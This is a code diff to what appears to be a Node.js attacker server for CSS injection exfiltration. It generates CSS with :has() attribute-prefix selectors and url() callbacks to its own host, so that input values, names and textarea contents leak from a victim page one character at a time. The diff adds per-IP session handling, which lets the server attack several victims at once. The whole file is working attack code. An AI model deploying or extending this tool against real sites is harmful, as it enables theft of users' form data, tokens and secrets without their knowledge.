@@ -9,6 +9,7 @@ const ATTRIBUTES = {__proto__:null,"input":["value","name"],"textarea":["name"],
 const MAX_ELEMENTS = 20;
 const MAX_VALUE = 200;
 const WAIT_TIME_MS = 500;
+const MAX_SESSION_AMOUNT = 1000;
 const SHOW_RESULTS_IN_BROWSER = true;
 const SHOW_RESULTS_IN_CONSOLE = true;
 
@@ -19,37 +20,50 @@ const SPACE = ' ';
 const SYMBOLS = "!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~";
 const CHARS = (LOWER_LETTERS + NUMBERS + UPPER_LETTERS + SPACE + SYMBOLS).split('');
 
-var stop = false, n = 0, prefixes = {__proto__:null};
-var tokens = [], foundToken = false, currentElementPos = 0;
+var session = new Map();
 
 const app = connect();
 const compression = require('compression');
 app.use(compression());
 
 app.use('/start', function(request, response){
-    n = 0;
-    tokens = [];
-    prefixes = {__proto__:null};
-    stop = false;                    
-    foundToken = false;
-    currentElementPos = 0;
-    genResponse(response, 0);
+    if(session.size > MAX_SESSION_AMOUNT) {
+        deleteOldSessions(Math.floor(MAX_SESSION_AMOUNT/2));
+    }
+    const ip = getIP(request);
+    const settings = new Map();
+    settings.set("init", true);
+    settings.set('n', 0);
+    settings.set('tokens', []);
+    settings.set('prefixes', new Map());
+    settings.set('foundToken', false);
+    settings.set('currentElementPos', 0);
+    session.set(ip, settings);
+    genResponse(request, response, 0);
 });
 
 app.use('/l', function(request, response){
     let req = url.parse(request.url, url);
+    const ip = getIP(request);
+    if(!hasSession(ip)) {
+        response.end();
+        return;
+    }
+    const n = session.get(ip).get('n');
+    const prefixes = session.get(ip).get('prefixes');
+    const currentElementPos = session.get(ip).get('currentElementPos');
     response.end();
     for(let element of ELEMENTS) {
         for(let attribute of ATTRIBUTES[element]) {                 
             let elementNumber = +req.query.e;
             if(n === +req.query.n && currentElementPos === elementNumber) {
                 if(typeof req.query['p_'+element[0]+attribute[0]+elementNumber] !== 'undefined') {
-                    if(typeof prefixes['p_'+element[0]+attribute[0]+elementNumber] === 'undefined') {
-                        prefixes['p_'+element[0]+attribute[0]+elementNumber] = '';
+                    if(!prefixes.has('p_'+element[0]+attribute[0]+elementNumber)) {
+                        prefixes.set('p_'+element[0]+attribute[0]+elementNumber, '');
                     } 
-                    if(req.query['p_'+element[0]+attribute[0]+elementNumber].length > prefixes['p_'+element[0]+attribute[0]+elementNumber].length) {
-                        prefixes['p_'+element[0]+attribute[0]+elementNumber] = req.query['p_'+element[0]+attribute[0]+elementNumber];                            
-                        foundToken = true;
+                    if(req.query['p_'+element[0]+attribute[0]+elementNumber].length > prefixes.get('p_'+element[0]+attribute[0]+elementNumber).length) {
+                        prefixes.set('p_'+element[0]+attribute[0]+elementNumber,req.query['p_'+element[0]+attribute[0]+elementNumber]);                        
+                        session.get(ip).set('foundToken',true);
                     }
                 }
             }                
@@ -59,40 +73,62 @@ app.use('/l', function(request, response){
 
 app.use('/next', function(request, response){
     setTimeout(x=>{            
+        const ip = getIP(request);
+        if(!hasSession(ip)) {
+            response.end();
+            return;
+        }
+        let foundToken = session.get(ip).get('foundToken');
         if(!foundToken) {
-            checkCompleted(response);
+            checkCompleted(request, response);
         } else {
-            foundToken =false;                  
+            session.get(ip).set('foundToken', false);
+            let n = session.get(ip).get('n');                  
             n++;
-            genResponse(response, currentElementPos);                
+            session.get(ip).set('n', n);
+            genResponse(request, response, session.get(ip).get('currentElementPos'));                
         }
     }, WAIT_TIME_MS);
 });
 
 app.use('/c', function(request, response){
-    let req = url.parse(request.url, url);
     response.end();
+    const ip = getIP(request);
+    if(!hasSession(ip)) {
+        response.end();
+        return;
+    }
+    const tokens = session.get(ip).get('tokens',true);
+    let req = url.parse(request.url, url);
     let attribute = req.query.a;
     let tag = req.query.t;
     let value = req.query.v;
-    if(!hasToken({tag, attribute, value})) {
+    if(!hasToken(tokens,{tag, attribute, value})) {
         tokens.push({tag, attribute, value});
-        foundToken = true;
+        session.get(ip).set('foundToken',true);
     }         
 });
 
-const genResponse = (response, elementNumber) => {
+const genResponse = (request, response, elementNumber) => {
+    const ip = getIP(request);
+    if(!hasSession(ip)) {
+        response.end();
+        return;
+    }
+    const n = session.get(ip).get('n');
+    const prefixes = session.get(ip).get('prefixes');
+    const tokens = session.get(ip).get('tokens');
     let css = '@import url('+ HOSTNAME + '/next?' + Date.now() + ');';
     let properties = [];
     for(let element of ELEMENTS) {
         for(let attribute of ATTRIBUTES[element]) { 
             const variablePrefix = '--'+element[0]+'-'+attribute[0]+'-'+elementNumber+'-'+n;  
-            if(typeof prefixes['p_'+element[0]+attribute[0]+elementNumber] === 'undefined') {
-                prefixes['p_'+element[0]+attribute[0]+elementNumber] = '';
+            if(!prefixes.has('p_'+element[0]+attribute[0]+elementNumber)) {
+                prefixes.set('p_'+element[0]+attribute[0]+elementNumber, '');
             }
-            const prefix = prefixes['p_'+element[0]+attribute[0]+elementNumber];
-            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(element,attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
-            css += 'html:has(['+attribute+'="'+ escapeCSS(prefix) + '"]'+generateNotSelectors(element,attribute)+')'+'{'+variablePrefix+'full:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
+            const prefix = prefixes.get('p_'+element[0]+attribute[0]+elementNumber);
+            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(tokens, element,attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
+            css += 'html:has(['+attribute+'="'+ escapeCSS(prefix) + '"]'+generateNotSelectors(tokens, element,attribute)+')'+'{'+variablePrefix+'full:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
         }
     }
     if(n === 0 && elementNumber === 0) {  
@@ -125,7 +161,7 @@ function escapeCSS(str) {
     return str.replace(/(["\\])/,'\\$1');
 }
 
-function hasToken(newToken) {
+function hasToken(tokens, newToken) {
     if(!tokens.length) {
         return false;
     }
@@ -133,24 +169,36 @@ function hasToken(newToken) {
     return tokens.find(tokenObject => tag === tokenObject.tag && attribute === tokenObject.attribute && value === tokenObject.value);
 }
 
-function checkCompleted(response) {
-    if(++currentElementPos < MAX_ELEMENTS) {
-        prefixes = {__proto__:null};
-        stop = false;
-        n = 0;
-        genResponse(response, ++currentElementPos);
-    } else {
-        stop = true;            
-        completed(response);
+function checkCompleted(request, response) {
+    const ip = getIP(request);
+    if(!hasSession(ip)) {
+        response.end();
+        return;
+    }
+    let currentElementPos = session.get(ip).get('currentElementPos');
+    if(currentElementPos + 1 < MAX_ELEMENTS) {    
+        session.get(ip).set('n', 0);
+        session.get(ip).set('currentElementPos', ++currentElementPos);
+        genResponse(request, response, currentElementPos);
+    } else {    
+        completed(request, response);
     }
 }
 
-function completed(response) {
+function destroySession(request) {
+    const ip = getIP(request);
+    session.delete(ip);
+}
+
+function completed(request, response) {
+    const ip = getIP(request);
+    const tokens = session.get(ip).get('tokens',true);
     if(SHOW_RESULTS_IN_CONSOLE) {
         console.log("Completed.", tokens);
     }
     if(!SHOW_RESULTS_IN_BROWSER) {
         response.end();
+        destroySession(request);
         return;
     }
     let extractedValues = '';
@@ -197,9 +245,10 @@ function completed(response) {
         }
     `);
     response.end();
+    destroySession(request);
 }
 
-function generateNotSelectors(elementName, attributeName) {
+function generateNotSelectors(tokens, elementName, attributeName) {
     let selectors = "";
     if(!tokens.length) {
         return '';
@@ -210,4 +259,28 @@ function generateNotSelectors(elementName, attributeName) {
         }
     }
     return selectors;
+}
+
+function getIP(request) {
+    return request.socket.remoteAddress
+}
+
+function deleteOldSessions(amount) {
+    var i = 0;
+    for (var k of session.keys()) {
+        if (i++ > amount) {
+            break;
+        }
+        session.delete(k);
+    }
+}
+
+function hasSession(ip) {
+    if(session.has(ip)) {
+        const settings = session.get(ip);
+        if(settings.has('init') && settings.get('init')) {
+            return true;
+        }
+    }
+    return false;
 }
